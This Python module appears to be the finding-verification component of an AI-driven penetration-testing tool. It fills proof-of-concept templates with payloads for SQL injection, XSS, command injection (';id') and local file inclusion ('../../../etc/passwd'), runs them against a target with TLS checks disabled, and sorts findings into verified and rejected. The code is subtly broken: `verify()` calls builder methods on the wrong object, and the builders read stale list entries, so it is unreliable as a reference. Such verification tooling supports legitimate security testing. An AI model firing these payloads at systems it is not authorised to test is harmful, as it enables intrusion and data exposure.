"""VulnClaw Vulnerability Verifier — validate findings before they enter the report.

Core principle: an unverified vulnerability = a false positive = not written to the report

Workflow:
    1. Receive a vulnerability hypothesis (pending finding)
    2. Generate PoC code
    3. Execute the PoC via python_execute
    4. Judge the result: verified / rejected
    5. Only verified vulnerabilities may enter the report
"""

from __future__ import annotations

import subprocess
import sys
import tempfile
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Optional

from vulnclaw.agent.context import VulnerabilityFinding


class VerificationStatus(str, Enum):
    """Vulnerability verification status."""

    PENDING = "pending"  # awaiting verification
    VERIFIED = "verified"  # verification passed
    REJECTED = "rejected"  # verification failed / false positive
    SKIPPED = "skipped"  # verification skipped (e.g. an already-confirmed fact)


class VerificationResult(str, Enum):
    """Verification result details."""

    # Verified outcomes
    VULN_CONFIRMED = "vuln_confirmed"  # vulnerability confirmed
    SENSITIVE_DATA_EXPOSED = "sensitive_data"  # sensitive data exposed
    SECURITY_BYPASS = "security_bypass"  # security control bypassed

    # Rejected outcomes
    FALSE_POSITIVE = "false_positive"  # false positive
    NO_RESPONSE_DIFF = "no_response_diff"  # no response difference
    PARAM_INVALID = "param_invalid"  # invalid parameter
    NORMAL_RESPONSE = "normal_response"  # normal response
    TIMEOUT = "timeout"  # timeout
    ERROR_403_404 = "error_403_404"  # 403/404 normal rejection
    EXECUTION_ERROR = "execution_error"  # PoC execution-environment error (e.g. missing interpreter)


@dataclass
class VerifiedFinding:
    """A verified vulnerability finding."""

    # 来自原始 finding 的信息
    original_finding: VulnerabilityFinding

    # 验证状态
    status: VerificationStatus = VerificationStatus.PENDING
    result: Optional[VerificationResult] = None

    # PoC 信息
    poc_code: Optional[str] = None
    poc_output: Optional[str] = None
    poc_executed_at: Optional[str] = None

    # 验证结论
    verified_description: str = ""
    verified_evidence: str = ""
    verified_severity: str = ""  # severity may be adjusted per the verification result

    # 排除原因（如果验证失败）
    rejection_reason: str = ""

    # 验证者（元信息）
    verified_by: str = "verifier_module"
    verified_at: str = field(default_factory=lambda: datetime.now().isoformat())


# ── PoC 生成器 ────────────────────────────────────────────────────────────────


class PoCGenerator:
    """Generate PoC code from a vulnerability hypothesis."""

    # 漏洞类型 → PoC 模板映射
    #
    # ⚠️ 模板使用 *单花括号* 作为 Python 语法（dict 字面量、f-string 插值）。
    # 唯一的模板占位符是 ``{target}`` / ``{payload}`` / ``{baseline_len}`` /
    # ``{path}``，它们由 :meth:`generate_poc` 通过 ``str.replace`` 精确替换。
    # 不要使用 ``{{`` / ``}}`` 转义——渲染器不是 ``str.format``，双花括号会原样
    # 残留到生成的 PoC 中，导致 ``dict`` 字面量变成 ``set``（``TypeError``）或
    # f-string 打印字面量 ``{var}`` 文本而非插值结果。
    POC_TEMPLATES: dict[str, str] = {
        "sql_injection": """
import requests

target = "{target}"
params = {
    "id": "{payload}",
}

try:
    r = requests.get(target, params=params, timeout=10, verify=False)
    text = r.text.lower()

    # SQL error signatures
    sql_errors = [
        "sql syntax", "mysql", "sqlite", "postgres", "oracle",
        "sqlstate", "microsoft sql", "odbc", "syntax error",
        "you have an error in your sql", "warning: mysql",
    ]

    for err in sql_errors:
        if err in text:
            print(f"[CONFIRMED] SQL injection: detected SQL error signature '{err}'")
            print(f"[INFO] response status code: {r.status_code}")
            exit(0)

    # Check response difference (if a normal baseline is provided)
    baseline_len = {baseline_len}
    if len(r.content) != baseline_len and baseline_len > 0:
        print(f"[POSSIBLE] abnormal response length: {len(r.content)} vs baseline {baseline_len}")

    print("[REJECTED] no SQL-injection signature detected")
except requests.Timeout:
    print("[REJECTED] request timed out")
except Exception as e:
    print(f"[ERROR] {e}")
""",
        "xss": """
import requests

target = "{target}"
payload = "{payload}"

try:
    r = requests.get(target, params={"q": payload}, timeout=10, verify=False)

    if payload in r.text:
        print("[CONFIRMED] XSS: payload appeared in the response")
        print("[INFO] sent the XSS payload; detected verbatim reflection")
        exit(0)

    print("[REJECTED] XSS payload did not appear in the response")
except Exception as e:
    print(f"[ERROR] {e}")
""",
        "command_injection": """
import requests

target = "{target}"
params = {
    "cmd": "{payload}",
}

try:
    r = requests.get(target, params=params, timeout=10, verify=False)
    text = r.text

    # Command-injection signatures
    cmd_indicators = ["uid=", "gid=", "root:", "/bin/bash", "whoami", "linux"]

    for indicator in cmd_indicators:
        if indicator in text:
            print(f"[CONFIRMED] command injection: detected '{indicator}'")
            exit(0)

    print("[REJECTED] no command-injection signature detected")
except Exception as e:
    print(f"[ERROR] {e}")
""",
        "debug_mode": """
import requests

target = "{target}"

try:
    # Normal request
    r_normal = requests.get(target, timeout=10, verify=False)
    len_normal = len(r_normal.content)

    # 调试模式请求
    r_debug = requests.get(target + "/?debug=1", timeout=10, verify=False)
    len_debug = len(r_debug.content)

    print(f"[INFO] normal response length: {len_normal}")
    print(f"[INFO] debug=1 response length: {len_debug}")

    # 检查调试信息泄露
    if len_debug != len_normal:
        diff = len_debug - len_normal
        print(f"[POSSIBLE] debug-mode response differs from normal, diff: {diff} bytes")

        # 检查是否真的泄露敏感信息
        debug_content = r_debug.text.replace(r_normal.text, "")
        if debug_content:
            sensitive_keywords = ["password", "secret", "api_key", "token", "db_", "connection"]
            for kw in sensitive_keywords:
                if kw.lower() in debug_content.lower():
                    print(f"[CONFIRMED] debug mode leaks sensitive info: detected '{kw}'")
                    exit(0)

        # 如果只是响应长度不同但没有敏感信息，降级为 Info
        print("[INFO] debug-mode response differs but no sensitive-info leak found; downgraded to Info")

    # 检查 debug 相关关键字
    if "debug" in r_debug.text.lower() and r_debug.text.lower().count("debug") > r_normal.text.lower().count("debug"):
        print("[POSSIBLE] debug mode includes extra debug info")

    print("[REJECTED] debug mode showed no obvious sensitive-info leak")

except Exception as e:
    print(f"[ERROR] {e}")
""",
        "lfi": """
import requests

target = "{target}"
payload = "{payload}"

try:
    r = requests.get(target, params={"file": payload}, timeout=10, verify=False)
    text = r.text.lower()

    # LFI 特征
    lfi_indicators = ["root:", "/bin/bash", "/bin/sh", "[boot loader]", "windows"]

    for indicator in lfi_indicators:
        if indicator in text:
            print(f"[CONFIRMED] LFI: detected '{indicator}'")
            exit(0)

    print("[REJECTED] no LFI signature detected")
except Exception as e:
    print(f"[ERROR] {e}")
""",
        "sensitive_file": """
import requests

target = "{target}"
path = "{path}"

try:
    r = requests.get(target + path, timeout=10, verify=False)

    if r.status_code == 200 and len(r.content) > 10:
        print(f"[CONFIRMED] sensitive file accessible: {path}")
        print(f"[INFO] status: {r.status_code}, length: {len(r.content)}")

        # 检查内容类型
        ct = r.headers.get("content-type", "")
        print(f"[INFO] Content-Type: {ct}")

        exit(0)

    print(f"[REJECTED] file not accessible or empty: {r.status_code}")
except Exception as e:
    print(f"[ERROR] {e}")
""",
        "info_disclosure": """
import requests

target = "{target}"

try:
    r = requests.get(target, timeout=10, verify=False)
    headers = {k.lower(): v.lower() for k, v in r.headers.items()}

    # 检查敏感 header
    sensitive_headers = {
        "x-powered-by": "tech-stack info",
        "server": "server info",
        "x-aspnet-version": "ASP.NET version",
        "x-generator": "generator info",
    }

    found = []
    for header, desc in sensitive_headers.items():
        if header in headers:
            found.append(f"{header}: {headers[header][:50]}")

    if found:
        print(f"[CONFIRMED] info disclosure: {len(found)} sensitive header(s)")
        for item in found:
            print(f"  - {item}")
        exit(0)

    print("[INFO] no obvious info disclosure found; this is a normal security-config matter")
    print("[REJECTED] response-header info disclosure - a config issue, not a vulnerability")
except Exception as e:
    print(f"[ERROR] {e}")
""",
    }

    @classmethod
    def generate_poc(
        cls,
        finding: VulnerabilityFinding,
        target: str,
        baseline_len: int = 0,
    ) -> str:
        """Generate PoC code by vulnerability type.

        Args:
            finding: the vulnerability finding
            target: the target URL
            baseline_len: normal response length (for comparison)

        Returns:
            the PoC Python code string
        """
        vuln_type = (finding.vuln_type or "").lower().replace(" ", "_")
        template = cls.POC_TEMPLATES.get(vuln_type)

        if not template:
            # 通用 PoC 模板
            template = cls._generic_template()

        payload = cls._guess_payload(finding)
        replacements = {
            "{target}": target,
            "{payload}": payload,
            "{baseline_len}": str(baseline_len),
            "{path}": payload,
        }
        for placeholder, value in replacements.items():
            template = template.replace(placeholder, value)
        return template

    @classmethod
    def _generic_template(cls) -> str:
        """Generate a generic PoC template.

        Used when a vulnerability type has no dedicated template. It compares the
        baseline response with the response after injecting the payload, running a
        heuristic check on common injection parameters: reflection detection,
        error/sensitive-signature scanning, and status-code / response-length
        differences, emitting ``[CONFIRMED]`` / ``[POSSIBLE]`` / ``[REJECTED]``
        markers consistent with :meth:`VerifierExecutor.parse_result`.
        """
        return """
import requests

target = "{target}"
payload = "{payload}"

# 常见的可注入参数名，逐个尝试注入 payload 并与基准响应对比
CANDIDATE_PARAMS = ["id", "q", "search", "name", "file", "page", "cmd", "url"]

# 通用的异常 / 敏感信息特征
SIGNATURES = [
    "sql syntax", "sqlstate", "mysql", "odbc", "you have an error in your sql",
    "traceback (most recent call last)", "stack trace", "fatal error",
    "warning:", "exception", "root:", "/bin/bash", "uid=", "gid=",
]


def fetch(params=None):
    return requests.get(target, params=params, timeout=10, verify=False)


try:
    baseline = fetch()
    base_status = baseline.status_code
    base_len = len(baseline.content)
    print(f"[*] baseline response: status={base_status}, len={base_len}")

    confirmed = False
    for name in CANDIDATE_PARAMS:
        try:
            r = fetch(params={name: payload})
        except Exception:
            continue

        # 1) 反射检测：payload 原样出现在响应中（潜在 XSS / 模板注入）
        if payload and payload in r.text:
            print(f"[CONFIRMED] payload reflected verbatim into the response at parameter '{name}'")
            confirmed = True
            break

        # 2) 错误 / 敏感信息特征扫描
        low = r.text.lower()
        hit = next((s for s in SIGNATURES if s in low), None)
        if hit:
            print(f"[CONFIRMED] parameter '{name}' triggered an error/sensitive signature: '{hit}'")
            confirmed = True
            break

        # 3) 响应差异：状态码变化或响应长度显著变化
        if r.status_code != base_status:
            print(f"[POSSIBLE] parameter '{name}' changed the response status code: {base_status} -> {r.status_code}")
        elif base_len and abs(len(r.content) - base_len) > max(50, int(base_len * 0.2)):
            print(f"[POSSIBLE] parameter '{name}' significantly changed the response length: {base_len} -> {len(r.content)}")

    if not confirmed:
        print("[REJECTED] generic verification detected no clear vulnerability signature")

except requests.Timeout:
    print("[REJECTED] request timed out")
except Exception as e:
    print(f"[ERROR] {e}")
"""

    @classmethod
    def _guess_payload(cls, finding: VulnerabilityFinding) -> str:
        """Guess a payload by vulnerability type."""
        vuln_type = (finding.vuln_type or "").lower()

        payloads = {
            "sql": "1' OR '1'='1",
            "xss": "<script>alert(1)</script>",
            "command": ";id",
            "lfi": "../../../etc/passwd",
        }

        for key, payload in payloads.items():
            if key in vuln_type:
                return payload

        return "test"


# ── 验证执行器 ───────────────────────────────────────────────────────────────


class VerifierExecutor:
    """Execute PoC verification and judge the result."""

    # Python 解释器路径：使用当前运行的解释器，避免 "python" 在仅有
    # "python3" 的环境中缺失而被误判为漏洞验证失败。
    PYTHON_CMD = sys.executable or "python"

    @classmethod
    def execute_poc(cls, poc_code: str, timeout: int = 30) -> tuple[int, str]:
        """Execute PoC code.

        Args:
            poc_code: the PoC Python code
            timeout: timeout in seconds

        Returns:
            (return code, output)
        """
        # 写入临时文件
        with tempfile.NamedTemporaryFile(
            mode="w",
            suffix=".py",
            delete=False,
            encoding="utf-8",
        ) as f:
            f.write(poc_code)
            temp_path = f.name

        try:
            # 执行 PoC
            result = subprocess.run(
                [cls.PYTHON_CMD, temp_path],
                capture_output=True,
                text=True,
                timeout=timeout,
            )

            output = result.stdout + result.stderr
            return result.returncode, output

        except subprocess.TimeoutExpired:
            return -1, "[TIMEOUT] PoC execution timed out"
        except FileNotFoundError:
            return -2, f"[ERROR] Python interpreter not found: {cls.PYTHON_CMD}"
        except Exception as e:
            return -3, f"[ERROR] execution failed: {e}"
        finally:
            # 清理临时文件
            try:
                Path(temp_path).unlink()
            except Exception:
                pass

    @classmethod
    def parse_result(cls, output: str, returncode: int) -> VerificationResult:
        """Parse PoC output and judge the verification result.

        Args:
            output: the PoC output
            returncode: the return code

        Returns:
            the verification result
        """
        output_lower = output.lower()

        # 执行失败
        if returncode == -1:
            return VerificationResult.TIMEOUT
        if returncode in (-2, -3):
            # -2: Python 解释器缺失；-3: PoC 执行本身抛出异常。
            # 均为执行环境问题，而非目标返回 403/404。
            return VerificationResult.EXECUTION_ERROR
        if returncode != 0:
            return VerificationResult.FALSE_POSITIVE

        # 检查确认标记
        if "[CONFIRMED]" in output or "[VERIFIED]" in output:
            if "敏感信息" in output or "sensitive" in output_lower:
                return VerificationResult.SENSITIVE_DATA_EXPOSED
            if "绕过" in output or "bypass" in output_lower:
                return VerificationResult.SECURITY_BYPASS
            return VerificationResult.VULN_CONFIRMED

        # 检查拒绝标记
        if "[REJECTED]" in output or "[FALSE]" in output:
            return VerificationResult.FALSE_POSITIVE

        # 检查响应差异
        if "[POSSIBLE]" in output:
            return VerificationResult.NO_RESPONSE_DIFF

        # 检查正常响应
        if returncode == 0 and "[CONFIRMED]" not in output:
            return VerificationResult.NORMAL_RESPONSE

        return VerificationResult.FALSE_POSITIVE


# ── 主验证器 ────────────────────────────────────────────────────────────────


class VulnerabilityVerifier:
    """Vulnerability verifier — the core verification flow."""

    def __init__(self, target: str, baseline_len: int = 0) -> None:
        """Initialize the verifier.

        Args:
            target: the target URL
            baseline_len: normal response length
        """
        self.target = target
        self.baseline_len = baseline_len
        self.verified_findings: list[VerifiedFinding] = []
        self.rejected_findings: list[VerifiedFinding] = []

    def verify(self, finding: VulnerabilityFinding) -> VerifiedFinding:
        """Verify a single vulnerability finding.

        Args:
            finding: the vulnerability finding

        Returns:
            the verified finding (with status and evidence)
        """
        vf = VerifiedFinding(original_finding=finding)

        # 生成 PoC
        poc_code = PoCGenerator.generate_poc(
            finding=finding,
            target=self.target,
            baseline_len=self.baseline_len,
        )
        vf.poc_code = poc_code

        # 执行 PoC
        returncode, output = VerifierExecutor.execute_poc(poc_code)
        vf.poc_output = output
        vf.poc_executed_at = datetime.now().isoformat()

        # 解析结果
        result = VerifierExecutor.parse_result(output, returncode)
        vf.result = result

        # 根据结果判定状态
        if result in (
            VerificationResult.VULN_CONFIRMED,
            VerificationResult.SENSITIVE_DATA_EXPOSED,
            VerificationResult.SECURITY_BYPASS,
        ):
            vf.status = VerificationStatus.VERIFIED
            vf._build_verified_finding(output)
        else:
            vf.status = VerificationStatus.REJECTED
            vf._build_rejected_finding(result, output)

        # 分类存储
        if vf.status == VerificationStatus.VERIFIED:
            self.verified_findings.append(vf)
        else:
            self.rejected_findings.append(vf)

        return vf

    def verify_batch(self, findings: list[VulnerabilityFinding]) -> list[VerifiedFinding]:
        """Verify vulnerability findings in bulk.

        Args:
            findings: the list of vulnerability findings

        Returns:
            the list of verified findings (verified only)
        """
        verified = []

        for finding in findings:
            vf = self.verify(finding)
            if vf.status == VerificationStatus.VERIFIED:
                verified.append(vf)

        return verified

    def _build_verified_finding(self, output: str) -> None:
        """Build the details of a verified finding."""
        vf = self.verified_findings[-1] if self.verified_findings else None
        if not vf:
            return

        original = vf.original_finding

        # 从输出中提取确认信息
        confirmed_lines = [
            line.strip()
            for line in output.split("\n")
            if "[CONFIRMED]" in line or "[VERIFIED]" in line
        ]

        vf.verified_description = (
            f"PoC verification passed. Original description: {original.description}"
            if original.description
            else "PoC verification confirmed the vulnerability exists"
        )
        vf.verified_evidence = "\n".join(confirmed_lines) if confirmed_lines else output[:500]
        vf.verified_severity = original.severity  # keep the original severity; may adjust per result

    def _build_rejected_finding(
        self,
        result: VerificationResult,
        output: str,
    ) -> None:
        """Build the details of a rejected finding."""
        vf = self.rejected_findings[-1] if self.rejected_findings else None
        if not vf:
            return

        original = vf.original_finding

        # 排除原因映射
        rejection_reasons = {
            VerificationResult.FALSE_POSITIVE: "No vulnerability signature detected after running the PoC; judged a false positive",
            VerificationResult.NO_RESPONSE_DIFF: "No response difference; the parameter is invalid or did not trigger the vulnerability",
            VerificationResult.PARAM_INVALID: "Invalid parameter; could not verify the hypothesis",
            VerificationResult.NORMAL_RESPONSE: "Returned a normal response; the vulnerability does not exist",
            VerificationResult.TIMEOUT: "PoC execution timed out",
            VerificationResult.ERROR_403_404: "Request rejected (403/404); the target is not exploitable",
            VerificationResult.EXECUTION_ERROR: "PoC execution-environment error (e.g. missing interpreter); could not verify",
        }

        vf.rejection_reason = rejection_reasons.get(
            result,
            f"Verification failed, reason: {result.value}",
        )

        # 记录排除原因，但不加入报告
        print(f"[VERIFIER] excluded vulnerability: {original.title} | reason: {vf.rejection_reason}")

    def get_verified_report_findings(self) -> list[VulnerabilityFinding]:
        """Get the list of vulnerabilities eligible for the report.

        Returns only verified vulnerabilities; rejected ones are excluded.
        """
        result = []

        for vf in self.verified_findings:
            if vf.status == VerificationStatus.VERIFIED:
                # 克隆 finding 并更新验证信息
                finding = vf.original_finding.model_copy()
                finding.evidence = vf.verified_evidence
                finding.description = vf.verified_description
                finding.severity = vf.verified_severity
                result.append(finding)

        return result

    def get_summary(self) -> dict[str, Any]:
        """Get the verification summary."""
        return {
            "total": len(self.verified_findings) + len(self.rejected_findings),
            "verified": len(self.verified_findings),
            "rejected": len(self.rejected_findings),
            "target": self.target,
            "verified_findings": [
                {
                    "title": vf.original_finding.title,
                    "severity": vf.verified_severity,
                    "result": vf.result.value if vf.result else None,
                }
                for vf in self.verified_findings
            ],
            "rejected_findings": [
                {
                    "title": vf.original_finding.title,
                    "reason": vf.rejection_reason,
                }
                for vf in self.rejected_findings
            ],
        }
